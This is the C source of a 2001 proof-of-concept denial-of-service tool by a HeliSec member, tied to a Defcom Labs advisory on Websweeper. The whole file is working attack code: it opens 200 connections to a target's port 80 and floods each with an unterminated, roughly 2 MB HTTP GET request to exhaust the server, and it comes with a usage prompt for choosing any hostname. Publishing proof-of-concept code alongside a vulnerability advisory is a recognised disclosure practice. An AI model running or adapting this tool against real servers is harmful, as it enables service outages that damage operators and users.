/*

----[ honoriak from [HeliSec] 22.3.2001

   	[ Proof of concept Websweeper Infinite HTTP Request DoS  ]
   	[ Advisory Defcom Labs Advisory def-2001-10	         ]

	Thanks to doing and all helisec members: merphe, jet-li, kiss,
	lyw0d, bonjy.

*/


#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <time.h>
#include <sys/time.h>
#include <fcntl.h>

#define PORT 80
#define LEN 2000000
#define CON 200

int i, v, n, sel, envi;
int cons[CON];
char ah[LEN];
char ahh[LEN + 7];
char *host;
fd_set env;
struct sockaddr_in victim;

void usage(char *prog) {
	printf("[ Websweeper Infinite HTTP Request DoS by honoriak@mail.ru ");
	printf("from Helisec ]\n");
	printf("-- Advisory: Defcom Labs Advisory def-2001-10 --\n\n");
	printf("Usage: %s hostname number_of_gets\n", prog);
	exit(0);
	}

unsigned long resolver(char *h)  {

struct in_addr h2;
struct hostent *hvic;

if (!(hvic = gethostbyname(h))) return(0);
memcpy((char *)&h2.s_addr, hvic->h_addr, hvic->h_length);
return(h2.s_addr);
}

int main(int argc, char *argv[])
{

	if (argc < 2)
        {
        	usage(argv[0]);
        }

bzero(&victim, sizeof(victim));
victim.sin_family = AF_INET;
victim.sin_port = htons(PORT);

if ( (inet_pton(AF_INET, argv[1], &victim.sin_addr)) <= 0)
	{
	victim.sin_addr.s_addr = resolver(argv[1]);
	}

if (!victim.sin_addr.s_addr) {
	printf("Error resolving host\n");
	exit(-1);
	}

for (i=0; i<=(LEN-1); i++)  ah[i] = 'a';
ah[LEN-1] = '\0';
printf("Sending Infinite HTTP Request...\n");

sprintf(ahh, "GET /%s\n", ah);

for (sel=0; sel < CON; sel++)
{

if ((cons[sel] = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
	printf("Error opening socket\n");
        exit(-1);
        }

if ( (n=connect(cons[sel], (struct sockaddr *)&victim, sizeof(victim))) < 0) {
                  printf("Error connecting\n");
                  exit(-1);
         }

}

for (sel=0; sel < CON; sel++) {

FD_SET(cons[sel], &env);

envi=select(cons[sel] + 1, NULL, &env, NULL, NULL);

if ( FD_ISSET(cons[sel], &env) ) {
if ( (send(cons[sel], ahh, strlen(ahh), 0)) < 1) {
	printf("Error sending\n");
	exit(-1);
	}
}

}
exit(-1);
}

/* [HeliSec] <=> [Helios Security and Administration] */

